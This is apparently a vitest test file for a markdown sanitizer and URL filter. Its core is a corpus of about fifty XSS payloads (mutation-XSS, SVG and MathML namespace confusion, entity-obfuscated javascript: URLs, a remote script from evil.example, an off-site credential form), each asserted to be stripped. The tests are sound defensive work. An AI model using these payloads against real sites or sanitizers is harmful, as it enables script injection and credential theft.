// Invariant: nothing executable survives sanitization or safeHref; assertions are properties, not snapshots.

import { describe, it, expect } from 'vitest';
import { sanitizeEducationMarkdown, safeHref } from './tiles';

describe('tiles.ts: marked + DOMPurify sanitization', () => {
  it('strips onerror from img tags (XSS via education markdown)', () => {
    const out = sanitizeEducationMarkdown('<img src=x onerror="alert(1)">');
    expect(out, 'onerror attribute must be removed by DOMPurify').not.toContain('onerror');
    expect(out, 'img element itself should survive (src scrubbed)').toContain('<img');
  });

  it('strips <script> tags entirely', () => {
    const out = sanitizeEducationMarkdown('Before\n<script>alert("xss")</script>\nAfter');
    expect(out, '<script> must be stripped').not.toContain('<script');
    expect(out, 'alert payload must not appear in output').not.toContain('alert');
    expect(out, 'prose before script must survive').toContain('Before');
    expect(out, 'prose after script must survive').toContain('After');
  });

  it('strips javascript: hrefs (href injection)', () => {
    const out = sanitizeEducationMarkdown('[click me](javascript:alert(1))');
    expect(out, 'javascript: href must be stripped').not.toContain('javascript:');
  });

  it('preserves safe inline SVG (cat-explainer diagrams — USE_PROFILES svg:true)', () => {
    const out = sanitizeEducationMarkdown(
      '<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40"/></svg>',
    );
    expect(out, 'safe SVG must survive sanitization').toContain('<svg');
    expect(out, 'circle element must survive').toContain('<circle');
  });

  it('preserves normal markdown prose intact', () => {
    const out = sanitizeEducationMarkdown('## Title\n\nA paragraph with **bold** and _italic_ text.');
    expect(out, 'heading must be rendered').toContain('<h2');
    expect(out, 'strong must be rendered').toContain('<strong>');
    expect(out, 'em must be rendered').toContain('<em>');
    expect(out, 'text content must survive').toContain('bold');
  });

  it('sanitizes onclick on arbitrary elements', () => {
    const out = sanitizeEducationMarkdown('<p onclick="stealCookies()">Click me</p>');
    expect(out, 'onclick must be stripped').not.toContain('onclick');
    expect(out, 'paragraph text should survive').toContain('Click me');
  });
});

interface HostileCase {
  category: string;
  name: string;
  raw: string;
  forbidden: RegExp[];
  mustContain?: RegExp[];
}

const MARK = 'xss_marker_9f2c';

const hostileCorpus: HostileCase[] = [
  {
    category: 'script',
    name: 'script tag carrying a payload',
    raw: `<script>window.${MARK}=1</script>`,
    forbidden: [/<script/i, new RegExp(MARK)],
  },
  {
    category: 'script',
    name: 'remote script tag inside markdown prose',
    raw: `Before\n\n<script src="//evil.example/x.js">window.${MARK}=1</script>\n\nAfter`,
    forbidden: [/<script/i, /evil\.example/i, new RegExp(MARK)],
    mustContain: [/Before/, /After/],
  },
  {
    category: 'event-handler',
    name: 'onload on svg root',
    raw: `<svg onload="window.${MARK}=1"><circle r="1"/></svg>`,
    forbidden: [/onload/i, new RegExp(MARK)],
  },
  {
    category: 'event-handler',
    name: 'onclick on a paragraph',
    raw: `<p onclick="window.${MARK}=1">click</p>`,
    forbidden: [/onclick/i, new RegExp(MARK)],
  },
  {
    category: 'javascript-url',
    name: 'javascript: markdown link',
    raw: `[click](javascript:window.${MARK}=1)`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'javascript-url',
    name: 'javascript: href with tab obfuscation',
    raw: `<a href="java\tscript:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'data-url',
    name: 'data:text/html anchor smuggling a script',
    raw: `<a href="data:text/html,<script>window.${MARK}=1</script>">click</a>`,
    forbidden: [/data:text\/html/i, /<script/i, new RegExp(MARK)],
  },
  {
    category: 'data-url',
    name: 'base64 data:text/html anchor',
    raw: `<a href="data:text/html;base64,${Buffer.from(`<script>window.${MARK}=1</script>`).toString('base64')}">click</a>`,
    forbidden: [/data:text\/html/i],
  },
  {
    category: 'data-url',
    name: 'data: SVG payload via object',
    raw: `<object data="data:image/svg+xml,<svg onload=window.${MARK}=1>"></object>`,
    forbidden: [/<object/i, /data:image\/svg/i, new RegExp(MARK)],
  },
  {
    category: 'svg-foreignobject',
    name: 'foreignObject smuggling an HTML event handler',
    raw: `<svg><foreignObject><img src=x onerror="window.${MARK}=1"></foreignObject></svg>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'svg-use-xlink',
    name: 'use href targeting javascript:',
    raw: `<svg><use href="javascript:window.${MARK}=1"/></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-use-xlink',
    name: 'use xlink:href targeting javascript:',
    raw: `<svg><use xlink:href="javascript:window.${MARK}=1"/></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-animate-set',
    name: 'animate mutating an anchor href to javascript:',
    raw: `<svg><a><animate attributeName="href" values="javascript:window.${MARK}=1"/><text>click</text></a></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-animate-set',
    name: 'set mutating an anchor href to javascript:',
    raw: `<svg><a><set attributeName="href" to="javascript:window.${MARK}=1"/><text>click</text></a></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'style-css-url',
    name: 'style element whose text carries markup',
    raw: `Prose.\n\n<style><img src=x onerror="window.${MARK}=1"></style>\n\nMore prose.`,
    forbidden: [/onerror/i, new RegExp(MARK)],
    mustContain: [/More prose/],
  },
  {
    category: 'style-css-url',
    name: 'style inside svg parsing its text as markup',
    raw: `<svg><style><img src=x onerror="window.${MARK}=1"></style></svg>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'mxss',
    name: 'style/img namespace-mutation payload',
    raw: `<svg><p><style><img src="</style><img src=x onerror=window.${MARK}=1//">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'namespace-confusion',
    name: 'math/mglyph namespace-confusion payload',
    raw: `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=window.${MARK}=1>"></mglyph></table></mtext></math>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'namespace-confusion',
    name: 'nested form with math/svg re-parent payload',
    raw: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=window.${MARK}=1 src=1>">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'namespace-confusion',
    name: 'annotation-xml switching math to html',
    raw: `<math><annotation-xml encoding="text/html"><img src=x onerror="window.${MARK}=1"></annotation-xml></math>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'comment',
    name: 'unclosed comment after prose',
    raw: `Prose.\n\n<!--<img src=x onerror="window.${MARK}=1">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'comment',
    name: 'comment closed by --!>',
    raw: `<!-- --!><img src=x onerror="window.${MARK}=1"> -->`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'comment',
    name: 'comment opener inside an attribute value',
    raw: `<p title="<!--"><img src=x onerror="window.${MARK}=1">--></p>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'raw-text-breakout',
    name: 'textarea closed from inside an attribute value',
    raw: `<textarea><img title="</textarea><img src=x onerror=window.${MARK}=1>"></textarea>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'svg-use-xlink',
    name: 'svg anchor xlink:href targeting javascript:',
    raw: `<svg><a xlink:href="javascript:window.${MARK}=1"><text>click</text></a></svg>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'svg-animate-set',
    name: 'onbegin on an allowed animation element',
    raw: `<svg><animateTransform attributeName="transform" onbegin="window.${MARK}=1"/></svg>`,
    forbidden: [/onbegin/i, new RegExp(MARK)],
  },
  {
    category: 'event-handler',
    name: 'self-firing ontoggle on details',
    raw: `<details open ontoggle="window.${MARK}=1">x</details>`,
    forbidden: [/ontoggle/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'form action javascript:',
    raw: `<form action="javascript:window.${MARK}=1"><input type="submit"></form>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'form button formaction javascript:',
    raw: `<form><button formaction="javascript:window.${MARK}=1">go</button></form>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'meta refresh to javascript:',
    raw: `<meta http-equiv="refresh" content="0;url=javascript:window.${MARK}=1">`,
    forbidden: [/<meta/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'base href hijack',
    raw: `<base href="javascript:window.${MARK}=1//">`,
    forbidden: [/<base/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'iframe javascript: src',
    raw: `<iframe src="javascript:window.${MARK}=1"></iframe>`,
    forbidden: [/<iframe/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'form-meta-base-iframe-object-embed',
    name: 'embed javascript: src',
    raw: `<embed src="javascript:window.${MARK}=1">`,
    forbidden: [/<embed/i, /javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'template-noscript',
    name: 'noscript-closing nesting escape',
    raw: `<noscript><p title="</noscript><img src=x onerror=window.${MARK}=1>">x</noscript>`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'template-noscript',
    name: 'template smuggling a script',
    raw: `<template><script>window.${MARK}=1</script></template>`,
    forbidden: [/<script/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'case-obfuscated event-handler attribute',
    raw: `<img src=x OnErRor="window.${MARK}=1">`,
    forbidden: [/onerror/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'decimal-entity-obfuscated javascript scheme',
    raw: `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'hex-entity-obfuscated javascript scheme',
    raw: `<a href="&#x6A;avascript:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'non-breaking-space obfuscated scheme',
    raw: `<a href="java\u00a0script:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'named-entity colon in the scheme',
    raw: `<a href="javascript&colon;window.${MARK}=1">click</a>`,
    forbidden: [/javascript/i, new RegExp(MARK)],
  },
  {
    category: 'unicode-entity-obfuscation',
    name: 'leading space and control character before the scheme',
    raw: `<a href=" \u0001javascript:window.${MARK}=1">click</a>`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'raw HTML block between markdown prose',
    raw: `# Title\n\nSome prose.\n\n<script>window.${MARK}=1</script>\n\nMore prose.`,
    forbidden: [/<script/i, new RegExp(MARK)],
    mustContain: [/Title/, /More prose/],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'inline HTML handler inside a markdown paragraph',
    raw: `Text <img src="x" onerror="window.${MARK}=1"> more.`,
    forbidden: [/onerror/i, new RegExp(MARK)],
    mustContain: [/more\./],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'reference-style link to javascript:',
    raw: `[click][a]\n\n[a]: javascript:window.${MARK}=1`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'markdown image with a javascript: src',
    raw: `![x](javascript:window.${MARK}=1)`,
    forbidden: [/javascript:/i, new RegExp(MARK)],
  },
  {
    category: 'markdown-html-passthrough',
    name: 'autolink to javascript:',
    raw: `<javascript:window.${MARK}=1>`,
    forbidden: [/href\s*=\s*["']?\s*javascript:/i],
  },
  {
    category: 'forbidden-tag',
    name: 'style element after a line of prose',
    raw: `Prose.\n\n<style>body{display:none} .${MARK}{color:red}</style>\n\nMore prose.`,
    forbidden: [/<style/i, new RegExp(MARK)],
    mustContain: [/Prose\./, /More prose/],
  },
  {
    category: 'forbidden-tag',
    name: 'style element nested in svg',
    raw: `<svg><style>.${MARK}{fill:red}</style><circle r="1"/></svg>`,
    forbidden: [/<style/i, new RegExp(MARK)],
    mustContain: [/<circle/],
  },
  {
    category: 'forbidden-tag',
    name: 'credential form posting off-site',
    raw: `<form action="https://${MARK}.example/collect" method="post"><input name="password" type="password"><button type="submit">Sign in</button></form>`,
    forbidden: [/<form/i, /<input/i, /<button/i, new RegExp(MARK)],
  },
  {
    category: 'forbidden-tag',
    name: 'select/textarea form controls',
    raw: `<select name="${MARK}"><option>a</option></select><textarea name="x">payload</textarea>`,
    forbidden: [/<select/i, /<textarea/i, new RegExp(MARK)],
  },
];

describe('tiles.ts: hostile-input corpus — nothing executable survives', () => {
  for (const c of hostileCorpus) {
    it(`[${c.category}] ${c.name}`, () => {
      const out = sanitizeEducationMarkdown(c.raw);
      for (const pattern of c.forbidden) {
        expect(out, `${c.category}/${c.name}: forbidden pattern ${pattern} found in "${out}"`).not.toMatch(
          pattern,
        );
      }
      for (const pattern of c.mustContain ?? []) {
        expect(out, `${c.category}/${c.name}: expected benign content ${pattern} missing from "${out}"`).toMatch(
          pattern,
        );
      }
    });
  }
});

describe('tiles.ts: safeHref', () => {
  it.each([
    ['https URL', 'https://grafana.othala.test', 'https://grafana.othala.test'],
    ['http URL', 'http://internal.host/path', 'http://internal.host/path'],
    ['root-relative path', '/apps/grafana', '/apps/grafana'],
    ['root-relative path with query', '/foo?bar=baz', '/foo?bar=baz'],
  ])('allows %s', (_name, input, expected) => {
    expect(safeHref(input)).toBe(expected);
  });

  it.each([
    ['javascript:', 'javascript:alert(1)'],
    ['javascript: (mixed case)', 'JavaScript:alert(1)'],
    ['data:', 'data:text/html,<script>alert(1)</script>'],
    ['vbscript:', 'vbscript:msgbox(1)'],
    ['blob:', 'blob:https://example.com/uuid'],
    ['file:', 'file:///etc/passwd'],
    ['ftp:', 'ftp://files.example.com'],
    ['empty string', ''],
  ])('blocks %s', (_name, input) => {
    expect(safeHref(input)).toBe('#');
  });
});
